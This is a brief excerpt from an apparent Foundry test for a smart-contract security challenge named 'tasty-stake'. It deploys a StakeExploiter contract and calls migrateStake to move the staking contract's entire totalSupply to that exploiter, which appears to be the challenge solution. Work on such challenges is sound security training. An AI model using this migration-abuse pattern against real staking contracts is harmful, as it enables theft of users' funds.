...
import {StakeExploiter} from "src/tasty-stake/StakeExploiter.sol";
...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        StakeExploiter exploiter = new StakeExploiter();
        tastyStaking.migrateStake(address(exploiter),tastyStaking.totalSupply());
